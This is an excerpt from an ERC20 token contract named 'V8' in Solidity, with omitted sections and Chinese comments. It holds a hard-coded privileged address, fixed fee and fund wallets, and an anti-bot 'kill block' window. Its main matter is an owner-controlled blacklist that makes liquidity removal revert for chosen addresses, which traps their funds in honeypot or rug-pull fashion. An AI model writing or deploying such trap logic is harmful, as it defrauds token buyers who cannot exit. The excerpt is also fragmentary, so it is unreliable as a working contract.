...
abstract contract Ownable {
    ...
    address public iAddress = 0xB6Cc469507E500d2379a07a6fa1488b0030A28f1;
...
contract V8 is IERC20, Ownable {
    ...
    mapping(address => bool) public _idoblackList;
    ...
    constructor() {
        ...
        _symbol = "V8";
        _decimals = 18;
        address ReceiveAddress = 0x653Ea81Ab7B3EBf5495c0263A900145CD5ab4379;
        address FundAddress = 0xA5146b94302d000D0b0305349829dd4E58caee8e;
        ...
        holderRewardCondition = 1 * 1e18;  //50USDT
        _rewardHoldCondition = 0 * tokenUnit; //0
            ...
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (0 == goMoonBlock) {
                    ...
                    if (
                        !isAddLP &&
                        !isRemoveLP &&
                        block.number < goMoonBlock + _killBlock
                    ) {
    ...
    function _tokenTransfer(
        ...
        if (takeFee) {
            ...
            if (isRemoveLP) {
                // 在检查之前，添加一个变量来表示是否需要移除LP费用

                bool shouldRemoveLPFee = !_idoblackList[recipient];

               if (shouldRemoveLPFee) {
                // 如果地址不在黑名单中，执行移除LP的逻辑
                feeAmount = (tAmount * _removeLPFee) / 10000;
                _takeTransfer(sender, _lpFeeReceiver, feeAmount);
               } else {
                 // 如果地址在黑名单中，执行禁止移除LP费用的操作
                 // 使用 require 来触发错误并提供错误消息
                  require(false, "LP fee removal not allowed for this address.");
            }
        ...
        onlyOwner
    {
     ...
     function setIDOBlackList(address addr, bool enable) external onlyAllowedAddress  {
        _idoblackList[addr] = enable;
    }

    function batchSetIDOBlackList(address[] memory addr, bool enable)
        external
        onlyAllowedAddress
    {
        for (uint256 i = 0; i < addr.length; i++) {
            _idoblackList[addr[i]] = enable;
        }
    }
    ...
    uint256 public holderCondition = 1000000; //LP
